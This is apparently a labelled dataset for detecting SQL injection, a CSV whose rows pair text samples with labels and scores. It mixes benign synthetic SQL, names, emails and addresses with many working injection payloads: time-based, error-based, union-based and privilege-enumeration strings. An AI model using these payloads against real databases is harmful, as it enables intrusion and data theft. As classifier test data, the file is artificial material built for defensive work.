1'||  (  select 'lzzr' where 2477  =  2477,1,1,1.0
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,1,1,1.0
"c/ pintor viver s/n, 1?b",0,0,0.06
"   select salmon, winter+ ', ' + strange+ ' ' + poor+ ', ' + stronger as board  from exact",0,0,0.0
96622444l,0,0,0.004468253314358248
"1%""   )    )     )   and 9198  =  9198--",1,1,1.0
select avg ( gentle ) from continued select sum ( cry ) ,0,0,0.0
70679983v,0,0,0.004468253314358248
3690,0,0,0.004468253314358248
"  update article set excellent =  'zipper', city =  'wherever' where roof =  owner",0,0,0.0
pangborne@europop.mw,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'jxqf' like 'jxqf",1,1,1.0
select count ( correct ) from form,0,0,0.0
"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,1,1.0
d6ntrotr566,0,0,0.004468253314358248
select sin ( 2 ) ;,0,0,0.0
" select * from combination order by dark, pile",0,0,0.0
select count ( youth )  from hide,0,0,0.0
salina-sonajew@almeriastella.vg,0,0,0.006527024015406931
" select * from took order by shelf, share",0,0,0.0
delete from review,0,0,0.0
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,1.0
padral gracida,0,0,0.004468253314358248
"  select cast,summer,tube from shut left join orders on typical.bottleid =  information.as order by camp.tonight",0,0,0.0
ci2586ta,0,0,0.004468253314358248
 update salt set did = 'garden'where orange = 'exclaimed',0,0,0.0
1.4996e+15,0,0,0.0
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1,1.0
select nose ( s )  from muscle select musical ( s ) ,0,0,0.0
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",1,1,1.0
"  select fightingid as id, fire as constantly from come",0,0,0.0
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,1,1,1.0
delete from zulu,0,0,0.0
1%' and 7533  =  7533 and '%'  =  ',1,1,1.0
select * from pile 3,0,0,0.0
8.32e+15,0,0,0.0
"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
3041,0,0,0.004468253314358248
"c/ secretario guedes aleman s/n,",0,0,0.0
select * from desert where flew = 'pleasure'  and  ( according = 'won' or flow = 'stretch' ) ,0,0,0.0
select * from lamp where thrown = 'shoe'  or accept = 'oldest',0,0,0.0
1' and 5967  =  4184#,1,1,1.0
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1,1,1.0
casademonts,0,0,0.004468253314358248
noel,0,0,0.004468253314358248
1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',1,1,1.0
" select * from force order by powerful, art",0,0,0.0
1'+  (  select 'cwta' where 6091  =  6091,1,1,1.0
select count ( * )  as sitting,0,0,0.0
1 where 1092  =  1092,1,1,1.0
14602519a,0,0,0.004468253314358248
select * from earlier where write = 'oxygen'  or wool = 'lie',0,0,0.0
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",1,1,1.0
jorge paquirachi,0,0,0.004468253314358248
if  (  2643  =  1393  )   select 2643 else drop function nqss--,1,1,1.0
select * from  ( select flies from keep ) ,0,0,0.0
1'  )   where 6045  =  6045,1,1,1.0
fortuny goyenaga,0,0,0.004468253314358248
select * from born where broken not like '[therefore]%',0,0,0.0
2.84001e+15,0,0,0.0
"juan de salcedo, 158 5?f",0,0,0.0
koichi,0,0,0.004468253314358248
14li6l4,0,0,0.004468253314358248
select * from instance where planet  between 10 and 20,0,0,0.0
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1.0
1'  )   as zxos where 2745  =  2745,1,1,1.0
select * from strong where event = 'obtain'  or phrase = 'daughter',0,0,0.0
select * from bottle where hearing = 'careful'  and  ( number = 'table' or excited = 'consist' ) ,0,0,0.0
select top 3 * from trail,0,0,0.0
8.04948e+15,0,0,0.0
whit,0,0,0.004468253314358248
1'||  (  select 'boib' where 9595  =  9595,1,1,1.0
select * from introduced where next = 'swung' fetch first 3 rows only,0,0,0.0
select window,0,0,0.03250505488953901
calafell palmieri,0,0,0.004468253314358248
hymen_israeli@aulahost.vc,0,0,0.004468253314358248
select avg ( cat )  from traffic  select sum ( percent ) ,0,0,0.0
1'||  (  select 'jlon' where 1461  =  1461,1,1,1.0
"insert into powder  ( tonight, supper, larger )  values  ( 'minute', 'spirit', 'characteristic' )  ",0,0,0.0
c7em,0,0,0.004468253314358248
select storm ( s )  from property select mood ( s ) ,0,0,0.0
"insert into change  ( rod, instead, tie )  values  ( 'bring', 'magnet', 'copper' )  ",0,0,0.0
select avg ( price ) from together,0,0,0.0
"  select poolid as id, constantly as airplane from hunt",0,0,0.0
53238791r,0,0,0.004468253314358248
select * from exist fetch first 50 percent rows onlyselect top 3 * from press,0,0,0.0
1 waitfor delay '0:0:10'--,1,1,0.98
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",1,1,1.0
2008,0,0,0.004468253314358248
select * from compass order by available,0,0,0.0
"calle manuel de falla, 65 5?a",0,0,0.0
"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",1,1,1.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  8   )    )    and 'i'  =  'i",1,1,1.0
chicle,0,0,0.004468253314358248
"1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
select * from caught fetch first 50 percent rows onlyselect top 3 * from floating,0,0,0.0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",1,1,1.0
select test ( s )  from open full outer join,0,0,0.0
select avg ( inside ) from proper select sum ( settlers ) ,0,0,0.0
"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1,1,1.0
"-3270%' or elt  (  9404  =  3498,3498  )   and '%'  =  '",1,1,1.0
select sing ( s )  from deeply left join,0,0,0.0
urea bernat,0,0,0.004468253314358248
"-6770"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1,1,1.0
1'||  (  select 'blvu' from dual where 9813  =  9813,1,1,1.0
montn,0,0,0.004468253314358248
"make_set  (  6174  =  9734,1  )  ",1,1,0.96
"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,1,1.0
"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,1,1,1.0
select return ( s from muscle right join,0,0,0.0
select * from  ( select motion from sum ) ,0,0,0.0
plza. felix rodriguez de la fuente 140 3a,0,0,0.0
"insert into gradually ( teeth, surprise, different, visitor, know, habit )  values  ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )  ",0,0,0.0
select alike ( s ) from molecular inner join,0,0,0.0
select top 50 percent * from customs,0,0,0.0
"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",1,1,1.0
" select * from angry order by meant asc, ask desc",0,0,0.0
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil",1,1,1.0
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,1,1.0
kara-lyn,0,0,0.006527024015406931
1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1,1,1.0
select cos ( pi (   )  )  ;,0,0,0.0
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,1,1.0
select * from couple where try = 'pupil'  or body = 'orbit',0,0,0.0
"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",1,1,1.0
aylmar6,0,0,0.004468253314358248
select * from cowboy where adjective between 'nuts' and 'sink',0,0,0.0
1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',1,1,1.0
"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1,1,1.0
select min ( variety )  as walk from eat,0,0,0.0
"  select log,front from night where thirty = 'unhappy' union select oldest, particles from stepped",0,0,0.0
ues,1,0,0.004468253314358248
superable,0,0,0.004468253314358248
1084,0,0,0.004468253314358248
select * from noun fetch first 3 rows only select top 50 percent * from noted,0,0,0.0
"1   )    )     )   union all select null,null,null,null#",1,1,1.0
select top 3 * from half select * from main 3select * from expect,0,0,0.0
select top 3 * from shot where dry = 'welcome',0,0,0.0
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,1,1.0
select announced ( s )  from visit left join,0,0,0.0
select * from corner where happy = 'orbit'  and  ( essential = 'draw' or special = 'brother' ) ,0,0,0.0
select liquid from battle union all select football from becoming order by thumb,0,0,0.0
delete from stiff,0,0,0.0
bablica,0,0,0.004468253314358248
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk",1,1,1.0
6.73367e+15,0,0,0.0
"1'+  (  select lang where 4191  =  4191 union all select null,null#",1,1,1.0
" select * from human order by social asc, exercise desc",0,0,0.0
"1' in boolean mode  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",1,1,1.0
select accident ( s )  from dull,0,0,0.0
oestreic,0,0,0.004468253314358248
"carretera ribas matama 160,",0,0,0.004468253314358248
select * from wonder where rocket not between 'example' and 'spider',0,0,0.0
velichcanich pairot,0,0,0.004468253314358248
coripe,0,0,0.004468253314358248
"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'luoj'  =  'luoj",1,1,1.0
6087,0,0,0.004468253314358248
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select up from recently union all select thank from tip order by pack,0,0,0.0
select * from whale where lamp = 'met'  and city = 'wooden',0,0,0.0
select option_value from wp_options where option_name  =  'options_footer_button_3_link' limit 1,0,0,0.0
almonacid de la cuba,0,0,0.0
"1,  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",1,1,1.0
"1""   )    )    as ylah where 9248  =  9248",1,1,1.0
select count ( happen )  from fair,0,0,0.0
"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1,1.0
select * from funny where wrapped between '1996-07-01' and '1996-07-31',0,0,0.0
select * from rice where recall = 'very'  and city = 'section',0,0,0.0
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,1,1,0.99
"   select itself, stood, protection from how where mountain  is null",0,0,0.0
fe4r0g6ent8,0,0,0.004468253314358248
select * from straight  where therefore = direction,0,0,0.0
select count ( incomeid ) from introduced,0,0,0.0
select * from coal fetch first 50 percent rows only,0,0,0.0
"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select pilot ( s )  from told,0,0,0.0
"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
4ip7237o8h2dira,0,0,0.004468253314358248
1%'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ',1,1,1.0
51780892a,0,0,0.004468253314358248
select wing from college,0,0,0.0
select * from tears fetch first 50 percent rows only,0,0,0.0
stetson,0,0,0.004468253314358248
8322,0,0,0.004468253314358248
herrmann@codwatw.edu,0,0,0.004468253314358248
"""  )   or benchmark  (  10000000,md5  (  1   )    )   #",1,1,1.0
1' and 7533  =  7533 and 'frvk'  =  'frvk,1,1,1.0
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""endx""  =  ""endx",1,1,1.0
select adult ( s )  from season select easy ( s ) ,0,0,0.0
barby,0,0,0.004468253314358248
"1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,1.0
"paseo rey, 167 8-f",0,0,0.010087719298245614
"  update collect set pocket =  'particular', city =  'rest' where struck =  limited",0,0,0.0
select * from easier where soon = 'hunt'  or minerals = 'from',0,0,0.0
-8224'  )   where 6504  =  6504 or 2461  =  5660,1,1,1.0
1'+  (  select 'ncny' where 5634  =  5634,1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 11406 )  order by meta_id asc",0,0,0.0
select * from easily where led = 'field',0,0,0.0
select count ( possibly )  from rose,0,0,0.0
"select sleep  (  5  )   and ""irxg""  =  ""irxg",1,1,1.0
"calle artigako haritza, s/n 8?d",0,0,0.0
select these ( s )  from clear select strange ( s ) ,0,0,0.0
select column_name from table_name where column_name in  ( ,0,0,0.01
select high ( s )  from snake union all,0,0,0.0
"1""   )    )    as swwb where 4244  =  4244",1,1,1.0
87811832v,0,0,0.004468253314358248
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,1,1,1.0
"1   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  8018  =  8018",1,1,1.0
"  select making as hang, class as [found]  from claws",0,0,0.0
"1"" rlike sleep  (  5  )  #",1,1,1.0
hermida fiordalizzi,0,0,0.004468253314358248
gonzalvo gorriti,0,0,0.004468253314358248
arima@hormigon-impreso.nu,0,0,0.006527024015406931
select * from frog fetch first 50 percent rows only,0,0,0.0
"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from perfect,0,0,0.0
maximiliano,0,0,0.004468253314358248
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1,1,1.0
 (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,1,1,0.99
tennant4,0,0,0.004468253314358248
antoine,0,0,0.004468253314358248
74132716j,0,0,0.004468253314358248
select * from design,0,0,0.0
"  select include,corner,first from thin left join orders on tongue.freshid =  young.class order by everywhere.flew",0,0,0.0
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",1,1,1.0
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,1.0
select * from  ( select seen from see ) ,0,0,0.0
select interest from men,0,0,0.0
"pl. quintero baez, 137",0,0,0.004468253314358248
select option_value from wp_options where option_name  =  'sm_organize_media' limit 1,0,0,0.0
select * from meant fetch first 50 percent rows only,0,0,0.0
1' and 1661  =  1244 and 'dcha'  =  'dcha,1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 9053 )  order by meta_id asc",0,0,0.0
"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1,1,1.0
select * from most order by people,0,0,0.0
6.52922e+15,0,0,0.0
"   select becoming, atomic, researchfrom carbon where modern  is not null",0,0,0.0
1'   )    )    as pqbq where 1865  =  1865,1,1,1.0
select * from corn where offer = 'atom' fetch first 3 rows only,0,0,0.0
select glass ( s )  from keep union,0,0,0.0
select * from color where rush  between 10 and 20,0,0,0.0
"  select * from us where rather in  ( 'basic', 'similar', 'certainly' )  ",0,0,0.0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1,1,1.0
"-8684 union all select 9519,9519,9519,9519--",1,1,1.0
"select * from generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1,1,1.0
"insert into aboard  ( smallest, large, somehow )  values  ( 'ready', 'maybe', 'element' )  ",0,0,0.0
select amount from equipment union select sides from whose order by advice,0,0,0.0
" select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",1,1,1.0
c/ guillen santacilla 94,0,0,0.0
huesca,0,0,0.004468253314358248
5215,0,0,0.004468253314358248
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,1,1.0
"1'  )   as nmzp where 3794  =  3794 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"insert into thirty ( stems, prepare, sure, lovely, surface, food )  values  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )  ",0,0,0.0
select avg ( habit ) from ago select sum ( manner ) ,0,0,0.0
"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",1,1,1.0
33560,0,0,0.004468253314358248
neira umbert,0,0,0.004468253314358248
" select * from users where id  =  1 +\+. union select null,@@version -- 1",1,1,1.0
select * from central fetch first 50 percent rows only,0,0,0.0
"  select knifeid as id, milk as string from even",0,0,0.0
 update breakfast set science = 'strong'where finish = 'main',0,0,0.0
"1'  )   union all select null,null#",1,1,1.0
select * from fastened where all not like '[driving]%',0,0,0.01
" select * from wire order by receive, knife",0,0,0.0
select count ( primitive ) from especially,0,0,0.0
select * from national where with  between 10 and 20,0,0,0.0
"iif  (  7953  =  3021,1,1/0  )  ",1,1,1.0
select count ( distinct share )  from warm,0,0,0.0
barreras de la bandera,0,0,0.0
select third ( s )  from about full outer join,0,0,0.0
select period ( s )  from thought select even from busy,0,0,0.0
 update serve set official = 'colony'where labor = 'dark',0,0,0.0
28011073v,0,0,0.004468253314358248
"  select dropid as id, four as importance from low",0,0,0.0
 or 0  =  0 --,1,1,0.92
select top 3 * from coal,0,0,0.0
"  select * from position where broke in  ( 'valuable', 'dinner', 'record' )  ",0,0,0.0
"   select employees.wide, count ( orders.alreadyid )  as spitefrom    ( ordersinner join away on orders.wireid  =  employees.contrastid ) ",0,0,0.0
winstanley@waterflyesp.hn,0,0,0.004468253314358248
"1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +'",1,1,1.0
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,1,1,1.0
1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,1,1,1.0
"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",1,1,1.0
select baby ( s )  from floating left join,0,0,0.0
"  select chief as half, sitting as [bound]  from average",0,0,0.0
illano,0,0,0.004468253314358248
8.58629e+14,0,0,0.0
select * from forth where missing = 'outer',0,0,0.0
"1%""   )    )    and   (  7817  =  4371  )  *4371 and    (    (   ""%""  =  """,1,1,1.0
aguilera troule,0,0,0.004468253314358248
yu-hung,0,0,0.006527024015406931
select * from powerful where melted between 'dinner' and 'topic',0,0,0.0
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",1,1,1.0
"1%"" union all select null,null,null,null,null,null,null--",1,1,1.0
select * from silent where society = 'failed' fetch first 3 rows only,0,0,0.0
select * from honor where moment = 'wave' fetch first 3 rows only,0,0,0.0
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,1,1.0
"  select shutid as id, canal as pile from bit",0,0,0.0
dagma,0,0,0.004468253314358248
select min ( flat )  as lower from railroad,0,0,0.0
select * from women where price not between 10 and 20,0,0,0.0
select floor ( 25.75 ) ;,0,0,0.0
select * from baby where smaller = 'treated' fetch first 3 rows only,0,0,0.0
1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',1,1,1.0
select top 3 * from lift where sound = 'shoulder' select * from fur,0,0,0.0
1 order by 1--,1,1,0.98
dowson@sehimaco.eg,0,0,0.004468253314358248
olmeda de la cuesta,0,0,0.0
"-1204'   )    )    union all select 3585,3585--",1,1,1.0
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,1,1.0
belva,0,0,0.004468253314358248
select * from goes  where any not like '[crew]%',0,0,0.0
1'   )    )    as xqam where 6750  =  6750,1,1,1.0
select * from stepped where broken between '1996-07-01' and '1996-07-31',0,0,0.0
nataln,0,0,0.004468253314358248
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1,1,0.99
57,0,0,0.004468253314358248
"   select count ( especially ) , crew from soldier by height",0,0,0.0
"  select joy,hunter,plastic from mission left join orders on child.finallyid =  corner.empty order by library.after",0,0,0.0
"1""   )    )    as svim where 4924  =  4924 and 7932  =  5870",1,1,1.0
select * from products where productname not between 'carnarvon tigers' and 'mozzarella di giovanni' order by productname;,0,0,0.01
-6145 or   (  8459  =  8459  )  *4906-- yklv,1,1,1.0
couri-manahan@copiar.com.fm,0,0,0.02
"1 union all select null,null,null,null,null,null#",1,1,1.0
1  )   where 2543  =  2543,1,1,1.0
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",1,1,1.0
"   select employees.fence, count ( orders.volumeid )  as chamberfrom    ( ordersinner join sister on orders.layersid  =  employees.cloudid ) ",0,0,0.0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1,1,1.0
foto3rfico,0,0,0.004468253314358248
"  update wash set clothing =  'guess', city =  'monkey' where nuts =  coming",0,0,0.0
78248698f,0,0,0.004468253314358248
"select count  (  *  )   from generate_series  (  1,5000000  )  --",1,1,0.97
select pg_sleep  (  5  )   and '%'  =  ',1,1,0.98
"  select * from outside where nervous in  ( 'aware', 'cut', 'all' )  ",0,0,0.02
select distinct force from lonely,0,0,0.0
"-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  8752  =  8752",1,1,1.0
"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
ostapchuk casal,0,0,0.004468253314358248
select count ( distinct cost )  from underline,0,0,0.0
17536,0,0,0.004468253314358248
pred6.finir,0,0,0.004468253314358248
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1,1,1.0
select standard from shoot union all select flies from saved order by children,0,0,0.0
shedd,0,0,0.004468253314358248
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1,1,1.0
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,1,1,1.0
"1""   )    )    as xcyo where 2929  =  2929",1,1,1.0
h46a00o,0,0,0.004468253314358248
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",1,1,1.0
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,1,1.0
robledo,0,0,0.004468253314358248
"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1,1.0
cuz,0,0,0.004468253314358248
select volume ( s ) from girl inner join,0,0,0.0
"calle profesor angel lacalle, s/n,",0,0,0.0
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,1.0
select * from taken where    not yesterday = 'saddle',0,0,0.0
maryrose,0,0,0.004468253314358248
select recall ( s )  from near select yard ( s ) ,0,0,0.0
2.79635e+15,0,0,0.0
